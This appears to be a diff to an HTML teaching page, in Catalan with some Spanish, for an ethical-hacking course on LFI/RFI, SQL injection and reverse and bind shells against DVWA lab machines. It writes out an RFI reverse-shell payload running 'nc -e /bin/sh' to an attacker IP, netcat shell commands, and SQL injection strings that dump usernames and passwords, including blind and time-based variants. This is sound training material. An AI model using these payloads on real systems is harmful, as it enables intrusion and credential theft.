@@ -11,7 +11,7 @@
   <link rel="stylesheet" href="estilsunitats.css">
   
 </head>
-<body>
+<body onload="actualitzaSelect()">
   <!--<button class="theme-toggle" onclick="toggleTheme()"></button> -->
   <button class="theme-toggle" onclick="toggleTheme()">
     <i class="hgi hgi-stroke hgi-sun-01" id="theme-icon"></i>
@@ -252,7 +252,7 @@
         <!--  katana : https://github.com/projectdiscovery/katana 
           https://hackers-arise.com/web-app-hacking-katana-a-next-generation-crawling-and-spidering-framework/  -->
 
-      <hr>  <h2>LFI , RFI</h2>
+      <hr> <hr> <h2>LFI , RFI</h2>
         <h3>LFI (Local File Inclusion)</h3>
         <p>El LFI (Local File Inclusion) és una <strong>vulnerabilitat</strong> de seguretat en aplicacions web que permet a un atacant 
           llegir, i de vegades executar, arxius des del servidor. L'atac es produeix quan una aplicació web inclou un 
@@ -269,8 +269,6 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
 
         <p>==> En la màquina DVWA, es proposa la URL ..</p>
         <code>/dvwa/vulnerabilities/fi/?page=file1.php</code>
-
-        
          
           <h4>Wrappers en php</h4>
           <p>En principi per explotar LFI usarem</p>
@@ -288,28 +286,6 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
             <p>El LFI te unes limitacions que si es pot fer un RFI, estes desapareixen</p>
           <p>Encara que els exemples que s'estan mostrant son en PHP, no s'ha d'oblidar que existeixen altres llenguatges de servidor
             com ASP, JSP, o Python a través dels seus Frameworks web, com Flask o Django, susceptibles de tindre els mateixos problemes.         </p>
-
-          <h4>Com fer una shell inversa aprofitant RFI</h4>
-          <p>Considerem que la IP atacant és la 10.0.10.40 i la ip victima és la 10.0.10.50</p>
-          <li>El atacant usa netcac per obrir un port amb un servidor local (de netcat)</li>
-          <code>$ nc -lnvp 4444</code>
-          <li>A més a més , l'atacant obri un server web simple per servir fitxers de comandos</li>
-          <pre><code>mkdir /tmp/files
-cd /tmp/files
-python3 -m http.server 80             </code></pre>
-          <li>Es posa un fitxer 'reverse.txt' amb</li>
-          <pre><code>
-&lt;?php
-    passthru("nc -e /bin/sh 10.0.10.40 4444");
-?>
-          </code></pre>
-
-          <p>Ara, per executar la reverse shell..</p>
-          <pre><code>
-en el navegador , posem la ip de la victima seguit del codi RFI  
-10.0.10.50/dvwa/vulnerabilities/fi/?page=http://10.0.10.40/reverse.txt
-          </code></pre>
-          
    
         <hr><h2>File upload vulnerabilities</h2>
           <p>Les vulnerabilitats de càrrega d'arxius (o file upload vulnerabilities) són defectes de seguretat en aplicacions web 
@@ -360,11 +336,22 @@ en el navegador , posem la ip de la victima seguit del codi RFI
         <h4>Com funciona una injecció SQL</h4>
         <p>Normalment, les aplicacions web utilitzen consultes SQL per a interactuar amb la seva base de dades. Per exemple, 
           per a autenticar un usuari, el codi PHP podria construir una consulta a partir d'un nom d'usuari i una contrasenya que l'usuari ha escrit en un formulari:</p>
-          <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = 'contrasenya';</code>
+          <form onsubmit="return actualitzaSelect()" style="background-color: lightgray; padding: 1%; width: 200px;" >
+              <label for="usuari">Usuari:</label><br>
+              <input type="text" id="usuari" name="usuari" value="enrique" required><br><br>
+
+              <label for="contrasenya">Contrasenya:</label><br>
+              <input type="password" id="contrasenya" name="contrasenya" value="44332211" required><br><br>
+
+              <button type="submit">Enviar</button>
+          </form>
+          <code style="color: darkgreen; "  id="query1"></code>
+
+         <!-- <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = 'contrasenya';</code> -->
         <p>Una aplicació és vulnerable a la injecció SQL si no saneja correctament l'entrada de l'usuari. Un atacant pot aprofitar-se d'això. Si l'atacant introdueix al camp de contrasenya:</p>
         <code>' OR '1'='1</code>
         <p>La consulta es convertiria en</p>
-          <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = '' OR '1'='1';</code>
+          <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = '<span style="color: brown;">' OR '1'='1</span>';</code>
         <p>Com que la condició '1'='1' sempre és vertadera, la base de dades retornarà totes les files, permetent que l'atacant iniciï sessió sense saber la contrasenya correcta.</p>
 
         <ul> Esta inserció es pot realitzar de diverses formes
@@ -373,7 +360,26 @@ en el navegador , posem la ip de la victima seguit del codi RFI
           <li>Pujada de fitxers al servidor que després seran executats</li>
           <li>etc..</li>
         </ul>
-        <h4>Tipus de injeccions SQL</h4>
+        <p>Una altra manera seria injectar en el primer camp (el de usuari) i posar comentari després..</p>
+        <code>' OR '1'='1 # </code>
+        <code>SELECT * FROM usuaris WHERE nom = '<span style="color: brown;">' OR '1'='1' #</span>  ' AND contrasenya = '';</code>
+        <p>També es convenient intentar provocar un error, per vore si podem saber el SGBD que està darrere.</p>
+        <pre><code>1' </code></pre>
+        <p>podria provocar un error</p>
+        <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1</code>
+        <p>i en este cas sabriem que hi ha un MySQL darrere</p>
+        <p>Quantes columnes torna la consulta??</p>
+        <code>1' ORDER BY 1 # 1,2,3,4... per vore quantes columnes torna la consulta (i després fer un UNION)</code>  
+        <p>primer podriem intentar vore el nom de la base de dadees (ara sabem que accepta sintaxi de MySQL)</p>
+        <code>' UNION SELECT 'nom base dades', database() #</code><br>
+        <p>Acte seguit, intentar vore les taules assolibles</p>
+        <code>1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#</code><br>
+        <p>Les columnes de una taula concreta</p>
+        <code>1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#</code><br>
+        <p>Per fi, extraure dades !!!</p>
+        <code>1' OR 1=1 UNION SELECT user, password FROM users #</code><br>
+
+        <hr><h4>Tipus de injeccions SQL</h4>
         <ul>
           <li>Injecció clàssica: L'atacant manipula la consulta per a accedir directament a dades sensibles o canviar la lògica de la consulta. L'exemple anterior n'és una mostra.</li>
           <li>Injecció cega (Blind SQL Injection): Es produeix quan la base de dades no retorna errors o dades directament a l'atacant. En lloc d'això, l'atacant formula preguntes la resposta de les quals es pot inferir a partir del comportament del lloc web. Per exemple, si una consulta retorna un error, la pàgina mostra un missatge, però si l'atacant aconsegueix que la consulta sigui vertadera, la pàgina es carrega normalment.</li>
@@ -386,7 +392,7 @@ en el navegador , posem la ip de la victima seguit del codi RFI
         <li>Us de operador UNION</li>
         <li>Descobrir l'estructura de la base de dades</li>
 
-        <h3>Blind Injection</h3>
+        <hr><h3>Blind Injection</h3>
         <p>La injecció SQL cega (Blind SQL Injection) és una tècnica d'atac on un atacant pot explotar una vulnerabilitat de injecció SQL, 
           però sense que la base de dades retorne cap error o dada directament a la pàgina web. En lloc de veure el resultat de la consulta 
           a la pantalla, l'atacant infereix la informació de la base de dades a partir del comportament de l'aplicació.</p>
@@ -410,7 +416,30 @@ en el navegador , posem la ip de la victima seguit del codi RFI
           fent que molts desenvolupadors no se n'adonin fins que ja és massa tard. La millor manera de previndre'l és utilitzar consultes 
           parametritzades per a totes les interaccions amb la base de dades.</p>
 
-         <h3>automatització del descobriment i explotació de injeccions SQL</h3> 
+        <h4>Prova de blind sql injeccion</h4>
+        <pre>Posar DVWA en nivell baix</pre>
+        <p>provar : <code>1' AND 1=1-- -</code> </p>
+        <p>Resultat esperat: ✅ “User ID exists in the database”</p>
+          <p>provar : <code>1' AND 1=2-- -</code> </p>
+         <p> Resultat esperat: ❌ “User ID is MISSING from the database” </p>
+         <p>El parametre es injectable i es poden fer condicions booleanes</p>
+         <pre>Comprovar si l’usuari admin existeix
+1' AND (SELECT COUNT(*) FROM users WHERE user='admin')=1-- - 
+Treure la longitud del password
+1' AND LENGTH((SELECT password FROM users WHERE user='admin'))=32-- -
+Treure el password caràcter a caràcter
+1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a'-- -       </pre>
+          <p>Blind injection per temps</p>
+          <pre>1' AND IF(1=1, SLEEP(5), 0)-- - </pre>
+          <p>Si la pàgina:  ⏳ Tarda 5 segons → condició TRUE ,   ⚡ Respon ràpid → FALSE</p>
+        <ul>
+          <li>DVWA és ideal per practicar Blind SQLi</li>
+          <li>Es basa en: Boolean-based (TRUE/FALSE)</li>
+          <li>Time-based (SLEEP)</li>
+          <li>No veus dades → les dedueixes</li>
+        </ul>
+
+         <hr><h3>automatització del descobriment i explotació de injeccions SQL</h3> 
          <p>Existeixen nombroses eines que permeten automatitzar el procés de detecció i exfiltració de dades
           en vulnerabilitats de injecció SQL.  Hi ha de lliures, propietaries, especéfiques com a part d'una solució integrada. Entre les més destacades i conegudes estan:    </p>
           <ul>
@@ -419,7 +448,7 @@ en el navegador , posem la ip de la victima seguit del codi RFI
             <li>NoSQLMap</li>
             <li>BBQSQL</li>
           </ul>
-          <h4>sqlmap</h4>
+          <hr><h3>sqlmap</h3>
           <p>És una eina de codi obert escrita en python i un test de penetració que automatitza el procés de detecció i explotació de vulnerabilitats d'injecció SQL en 
             aplicacions web i, posteriorment, de presa de control del servidor de la base de dades</p>
 
@@ -431,20 +460,20 @@ en el navegador , posem la ip de la victima seguit del codi RFI
           <p>Aquest vídeo tutorial mostra com fer servir SQLMap en un entorn de proves, que és una manera segura de practicar les tècniques d'auditoria
              <a href="https://www.youtube.com/watch?v=PwFXqUrIpV8">de 12 minuts</a> </p>  
           
-          <h4>jSQL Injection</h4>
+          <hr><h4>jSQL Injection</h4>
           <p>És una eina multiplataforma de codi obert escrita en java, relativament fàcil d'utilitzar amb una GUI </p>
           <p>En les ultimes versions de kali no ve incorporada, però es pot instal·lar fàcilment amb:</p>
           <code>$ sudo apt update && sudo apt install jsql-injection</code>
           <p>El lloc web <strong>Vulnweb.com</strong> disposa de varios llocs vulnerables on poder practicar</p>
 
-          <h4>NoSQLMap</h4>
+          <hr><h4>NoSQLMap</h4>
           <p>NoSQLMap és una eina de codi obert escrita en Python que automatitza la injecció de codi i altres vulnerabilitats
              en bases de dades NoSQL, especialment en MongoDB i altres bases de dades basades en JSON.</p>
           <p>Aquesta eina està dissenyada per a auditar la seguretat de les aplicacions que utilitzen bases de dades NoSQL, 
             ja que les tècniques d'injecció SQL tradicionals no són aplicables. NoSQLMap es va crear per a omplir el buit que 
             va deixar l'eina SQLMap, ja que aquesta última se centra exclusivament en bases de dades SQL</p>
           
-          <h4>BBQSQL</h4>
+          <hr><h4>BBQSQL</h4>
           <p>BBQSQL és una eina en linea de comandos de codi obert i escrita en python, que explota la injecció SQL cega
              (Blind SQL Injection) de manera automàtica. A diferència d'eines com SQLMap, que tenen una lògica 
              complexa per a diferents SGBD i tipus d'injecció, BBQSQL se centra exclusivament en l'explotació de la injecció SQL cega 
@@ -647,7 +676,29 @@ en el navegador , posem la ip de la victima seguit del codi RFI
           </ul>
           <p>Abans de fer el log poisoning, s'ha de comprovar si es disposa d'accés a algun d'estos fitxers.</p>
 
-          <h3>Estabilitzar shell</h3>
+          <hr>
+         <h4>Com fer una shell inversa aprofitant RFI</h4>
+          <p>Considerem que la IP atacant és la 10.0.10.40 i la ip victima és la 10.0.10.50</p>
+          <li>El atacant usa netcac per obrir un port amb un servidor local (de netcat)</li>
+          <code>$ nc -lnvp 4444</code>
+          <li>A més a més , l'atacant obri un server web simple per servir fitxers de comandos</li>
+          <pre><code>mkdir /tmp/files
+cd /tmp/files
+python3 -m http.server 80             </code></pre>
+          <li>Es posa un fitxer 'reverse.txt' amb</li>
+          <pre><code>
+&lt;?php
+    passthru("nc -e /bin/sh 10.0.10.40 4444");
+?>
+          </code></pre>
+
+          <p>Ara, per executar la reverse shell..</p>
+          <pre><code>
+en el navegador , posem la ip de la victima seguit del codi RFI  
+10.0.10.50/dvwa/vulnerabilities/fi/?page=http://10.0.10.40/reverse.txt
+          </code></pre>
+
+          <hr><h3>Estabilitzar shell</h3>
           <p>És molt recomanable estabilitzar una shell inversa després d'obtenir-la amb nc (netcat), sobretot en un entorn de hacking ètic o pentesting controlat.
              Una shell sense estabilitzar és limitada i pot comportar problemes pràctics durant l’execució de comandes.</p>
           <ul>Les shells bàsiques obtingudes amb nc solen tindre aquests inconvenients
@@ -673,6 +724,8 @@ Si existeix, l'ordre retorna on està l'executable, si no existeix no retorna re
             <code>sudo loadkeys es</code>
           </p>
 
+          <hr>
+ 
       </section>
 
 
@@ -794,20 +847,22 @@ find / -user root -perm -u=s 2>/dev/null         </code></pre>
           <li>Revisar logs si el client ho sol·licita</li>
       </ul>
 
-      <hr><pre>        Reverse shell             versus             Bind shell</pre>
-      <img src="imgs/revShell.png" alt="reverse shell"  width="40%"  >
-      <img src="imgs/bindShell.png" alt="reverse shell"  width="40%"  >
+      <hr><pre>        Reverse shell   versus   Bind shell</pre>
+      
+      <img src="imgs/bindShell.png" alt="reverse shell"  width="40%" class="imatge-dreta" >
       <h3>Bind Shell</h3>
       <p>En una Bind Shell, la victima escolta (server) i l'atacant connecta.</p>
-      <p>Atacant (Kali) ---> Connecta ---> Víctima (port obert escoltant)</p>
+      <p>Atacant (Kali) -=> Connecta -=> Víctima (port obert escoltant)</p>
       <pre># En la VÍCTIMA (Metasploitable/Linux):
 nc -lvp 4444 -e /bin/bash
 
 # En l'ATACANT (Kali):
 nc 192.168.56.20 4444   #ip de la victima</pre>
-        <h3>Reverse Shell</h3>
+       
+      <img src="imgs/revShell.png" alt="reverse shell"  width="40%" class="imatge-dreta" >
+       <h3>Reverse Shell</h3>
       <p>En una Reverse shell, l'atacant escolta i la victima connecta (evitant els firewalls)</p>
-      <p>Víctima ---> Connecta ---> Atacant (escoltant)</p>
+      <p>Víctima -=> Connecta -=> Atacant (escoltant)</p>
       <pre># ATACANT (Kali) - Escolta primer:
 nc -nlvp 4444
 
@@ -822,6 +877,49 @@ nc 192.168.56.10 4444 -e /bin/bash   # ip de l'atacant</pre>
 
       </section>         
  
+     <section>
+      <h1>Annexos</h1>
+     <h2>linpeas:</h2>
+     <p>En pentesting, la herramienta linPEAS (muchas veces escrita por error como limpeas) se utiliza para enumeración de escalada de 
+      privilegios en sistemas Linux.</p>
+     <h3>¿Qué hace linPEAS? </h3>     
+      <p>Es un script de auditoría que recopila automáticamente información del sistema para detectar posibles vectores de escalada de privilegios. 
+        No explota nada por sí mismo: te muestra pistas que luego el pentester analiza.</p>
+    <p>Forma parte del proyecto PEASS-ng (Privilege Escalation Awesome Scripts Suite).</p>
+     <p>Los resultados suelen estar codificados por colores, destacando en rojo/amarillo lo más crítico. </p>
+      <h3>¿En qué fase del pentest se usa? </h3>
+      <p>👉 Post-explotación, cuando ya tienes acceso como usuario normal y quieres ver si puedes elevar privilegios a root </p> 
+        <h3>  ¿Qué información busca? </h3>
+            <p>Entre otras cosas, linPEAS revisa: </p>
+    <ol>
+      <li>🔐 Permisos inseguros:  Archivos SUID/SGID,  Scripts o binarios modificables</li>
+      <li>👤 Configuración de usuarios : Usuarios con permisos elevados . Contraseñas en texto plano</li>
+      <li>⚙️ Servicios y procesos: Servicios corriendo como root , Binarios vulnerables</li>
+      <li>📦 Software vulnerable:  Versiones del kernel, Programas con exploits conocidos</li>
+      <li>🧠 Variables de entorno: PATH mal configurado, Credenciales expuestas</li>
+      <li>📁 Tareas programadas:  Cron jobs mal configurados</li>
+    </ol>
+      <p>Altres eines similars :  LES, LinEnum</p>
+
+      <h2>pspy  pspy64 </h2>
+      <p>   En un entorno de pentesting, pspy64 es una herramienta muy usada para enumeración de escalada de privilegios en sistemas Linux.
+    </p>
+        <h3>¿Qué es pspy64?
+    </h3>
+        <p>pspy64 es la versión 64 bits de pspy, una herramienta que permite monitorizar procesos en ejecución sin necesidad de privilegios root.
+    </p>
+    <p>🔑 Punto clave: no requiere permisos elevados para funcionar.     </p>
+      <h3>¿Qué hace exactamente?     </h3>
+    <ul>pspy64 observa en tiempo real:
+      <li>Procesos que se ejecutan</li>
+      <li>Comandos lanzados por otros usuarios</li>
+      <li>Tareas programadas (cron jobs)</li>
+      <li>Scripts que se ejecutan automáticamente</li>
+      <li>Binarios que se lanzan con sudo, SUID, o por root</li>
+    </ul>
+
+
+     </section> 
       
 
     </main>
@@ -835,5 +933,25 @@ nc 192.168.56.10 4444 -e /bin/bash   # ip de l'atacant</pre>
 
   
     <script src="scriptsunitats.js"></script>
+
+    <script>
+        function actualitzaSelect() {
+            const usuari = document.getElementById("usuari").value;
+            const contrasenya = document.getElementById("contrasenya").value;
+
+            const select = document.getElementById("query1");
+
+            // Neteja el select i afegeix una nova opció
+            select.innerHTML = "";
+            const novaOpcio = document.createElement("option");
+            novaOpcio.textContent = "Usuari: " + usuari + " | Contrasenya: " + contrasenya;
+            novaOpcio.textContent = "SELECT * FROM usuaris WHERE nom = '"+usuari+"' AND contrasenya = '"+contrasenya+"'";
+            select.appendChild(novaOpcio);
+
+            return false; // evita que el formulari es recarregui
+        }
+           // document.addEventListener("DOMContentLoaded", () => { actualitzaSelect();  });  // altra manera, no posant en el body
+    </script>
+
 </body>
 </html>
